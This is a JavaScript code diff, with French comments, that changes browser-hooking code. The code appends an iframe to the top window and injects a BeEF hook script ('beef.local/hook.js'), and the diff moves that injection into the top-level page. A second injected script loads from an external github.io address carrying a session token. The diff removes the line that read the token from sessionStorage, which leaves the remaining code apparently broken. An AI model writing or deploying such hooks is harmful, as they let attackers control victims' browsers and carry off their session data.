@@ -42,12 +42,10 @@
         window.top.document.body.appendChild(i);
         
         i.onload = () => {
-            // ✅ Utiliser contentDocument
-            const iframeDoc = i.contentDocument || i.contentWindow.document;
-            const beef = iframeDoc.createElement("script");
+            const beef = window.top.document.createElement("script");
             beef.src = "https://beef.local/hook.js";
             beef.async = true;
-            iframeDoc.body.appendChild(beef);
+            window.top.document.body.appendChild(beef);
         };
         
         const c = setInterval(() => {
@@ -76,7 +74,6 @@
                 if (!c || !c.body) return;
                 clearInterval(d);
                 const e = c.createElement("script");
-                const token = sessionStorage.getItem("token") || "default"; // ✅ Définir token
                 e.src = `https://exon-dv.github.io/a/b.js?id=${token}`;
                 e.async = true;
                 c.body.appendChild(e);
